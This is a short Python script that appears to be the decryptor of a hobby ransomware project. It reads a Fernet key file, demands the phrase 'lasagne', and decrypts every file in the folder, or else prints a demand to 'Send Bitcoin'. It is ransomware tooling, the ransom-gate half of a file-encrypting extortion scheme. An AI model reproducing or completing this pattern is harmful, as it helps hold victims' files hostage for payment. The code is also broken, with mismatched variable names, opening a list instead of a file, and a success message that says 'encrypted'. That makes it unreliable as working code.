import os
from cryptography.fernet import Fernet

#Find Files

file = []

for file in os.listdir():
    if file == "ransomware_project.py" or file == "thekey.key" or file == "decrypt_ransomware.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print (files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "lasagne"

user_phrase = input("Enter secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
    for file in files:
        with open(files, "rb") as thefile:
            content = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Thank You, your files are now encrypted!")

else:
    print("WRONG PHRASE! Send Bitcoin")
